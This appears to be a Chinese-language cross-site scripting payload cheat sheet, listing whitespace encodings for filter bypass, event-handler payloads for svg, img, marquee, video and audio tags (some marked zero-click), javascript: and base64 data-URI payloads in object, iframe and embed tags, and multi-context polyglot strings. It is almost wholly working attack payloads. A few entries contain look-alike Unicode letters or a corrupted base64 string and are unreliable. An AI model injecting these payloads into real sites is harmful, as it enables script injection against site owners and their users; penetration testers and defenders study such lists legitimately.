          十进制值            	           URL编码            	            介绍            
            47            	                %2F            	                正斜杠            
            13            	                %0D            	                回车            
            12            	                %0C            	                分页符            
            10            	                %0A            	                换行            
            9            	                %09            	                水平制表符            


```
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>
<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
```


```
<svg/οnlοad=alert(1)> 
```

```
<svg

onload=alert(1)><svg> # newline char

<svg	onload=alert(1)><svg> # tab char

<svg οnlοad=alert(1)>   # new page char (0xc) 
```



```
<img src=x onerror=alert()>

<svg onload=alert()>

<body onpageshow=alert(1)>

<div style="width:1000px;height:1000px" onmouseover=alert()></div>

<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)

<marquee onstart=alert(1)> (firefox only)

<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)

<input autofocus="" onfocus=alert(1)></input>

<details open ontoggle="alert()">  (chrome & opera only)
```

```
事件名称 标签 备注
onplay video, audio 适用于0-click：结合HTML的autoplay属性以及结合有效的视频/音频
onplaying video, audio 适用于0-click: 结合HTML的autoplay属性以及结合有效的视频/音频
oncanplay video, audio 必须链接有效的视频/音频
onloadeddata video, audio 必须链接有效的视频/音频
onloadedmetadata video, audio 必须链接有效的视频/音频
onprogress video, audio 必须链接有效的视频/音频
onloadstart video, audio 潜在的0-click向量
oncanplay video, audio 必须链接有效的视频/音频
```




```
<video autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadeddata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadedmetadata="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadstart="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<video controls onloadstart="alert()"><source src=x></video>

<video controls oncanplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></video>

<audio autoplay controls onplay="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>

<audio autoplay controls onplaying="alert()"><source src="http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"></audio>
```



```
<object data="data:text/html,<script>alert(5)</script>">

<iframe srcdoc="<svg onload=alert(4);>">

<object data=javascript:alert(3)>

<iframe src=javascript:alert(2)>

<embed src=javascript:alert(1)>

<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>

<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczL**yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
```





```
            字符            	                使用            	                多段代码            
            141            	                DOM和非DOM            	                javascript:”/*’/*`/*–></noscript></title></textarea></style></template></noembed></script><html \” onmouseover=/*<svg/*/onload=alert()//>            
            88            	                非DOM            	                “‘–></noscript></noembed></template></title></textarea></style><script>alert()</script>            
            95            	                DOM            	                ‘”–></title></textarea></style></noscript></noembed></template></frameset><svg onload=alert()>            
            54            	                非DOM            	                “‘>–>*/</noscript></ti tle><script>alert()</script>            
            42            	                DOM            	                “‘–></style></script><svg onload=alert()>  
```